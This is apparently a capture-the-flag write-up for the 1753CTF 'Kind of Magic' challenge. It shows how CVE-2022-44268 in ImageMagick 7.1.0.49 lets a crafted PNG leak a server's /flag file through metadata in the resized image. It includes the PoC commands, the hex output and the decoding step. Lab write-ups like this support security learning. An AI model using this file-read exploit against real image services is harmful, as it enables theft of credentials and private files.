# 🪄 Kind of Magic (Score: 140 / Solves: 36)

## Description

> Why generate thumbnails locally, when there's a web service to do it remotely?
>
> <https://kind-of-magic-658deb1116d1.1753ctf.com/>
>
> <https://dl.1753ctf.com/kind-of-magic/?s=2ZPdSFSk>

## Source Code

<details><summary>file tree</summary>

```console
$ unzip -d kind-of-magic -q kind-of-magic_.zip; cd kind-of-magic
$ tree .
.
├── Dockerfile
├── run
└── src
    ├── Cargo.lock
    ├── Cargo.toml
    ├── Rocket.toml
    ├── src
    │   ├── image_from_request_body.rs
    │   └── main.rs
    └── static
        ├── index.html
        ├── main.css
        └── main.js

4 directories, 10 files
```

</details>

<details><summary>Dockerfile</summary>

```dockerfile
FROM archlinux:latest

ARG FLAG

RUN mkdir /app
WORKDIR /app

EXPOSE 1337

RUN pacman --noconfirm -Syu && \
    pacman --noconfirm -S libpng libraqm liblqr libxext fontconfig lcms2 libltdl pkg-config clang rust && \
    curl https://archive.archlinux.org/packages/i/imagemagick/imagemagick-7.1.0.49-1-x86_64.pkg.tar.zst > imagemagick-7.1.0.49.tar.zst && \
    pacman --noconfirm -U imagemagick-7.1.0.49.tar.zst && \
    rm imagemagick-7.1.0.49.tar.zst

RUN echo $FLAG > /flag
ADD src src

RUN cd src && cargo build -r && cp target/release/image_resizer .. && cargo clean

RUN cp src/Rocket.toml . && ln -s src/static .

CMD ["/app/image_resizer"]
```

</details>

## Flag

1753c{there_is_magic_in_the_air_its_called_CVE_2022_44268}

## Summary

- Information Leak by CVE-2022-44268

## Initial Analysis

The application is vulnerable to [CVE-2022-44268](https://www.cve.org/CVERecord?id=CVE-2022-44268) due to the installation of ImageMagick 7.1.0.49.

- PoC: [Sybil-Scan/imagemagick-lfi-poc: ImageMagick LFI PoC \[CVE-2022-44268\]](https://github.com/Sybil-Scan/imagemagick-lfi-poc?tab=readme-ov-file)

Since the flag is located at `/flag`, we can get the flag by executing a PoC to read `/flag` file.

## Solution

```console
$ git clone --quiet https://github.com/Sybil-Scan/imagemagick-lfi-poc.git; cd imagemagick-lfi-poc

$ python3 generate.py -f "/flag" -o exploit.png

   [>] ImageMagick LFI PoC - by Sybil Scan Research <research@sybilscan.com>
   [>] Generating Blank PNG
   [>] Blank PNG generated
   [>] Placing Payload to read /flag
   [>] PoC PNG generated > exploit.png

$ # upload exploit.png to the challenge server and download resize.png

$ identify -verbose ~/Downloads/resized.png .
...
    png:tIME: 2024-03-17T06:04:07Z
    Raw profile type:

      59
31373533637b74686572655f69735f6d616769635f696e5f7468655f6169725f6974735f
63616c6c65645f4356455f323032325f34343236387d0a

    signature: ddc8a768f0708272396e3281283e395a7f8b044dbc66aa24de020cfb4bf67702
...

$ python3 -c 'print(bytes.fromhex("31373533637b74686572655f69735f6d616769635f696e5f7468655f6169725f6974735f63616c6c65645f4356455f323032325f34343236387d0a"))'
b'1753c{there_is_magic_in_the_air_its_called_CVE_2022_44268}\n'
```
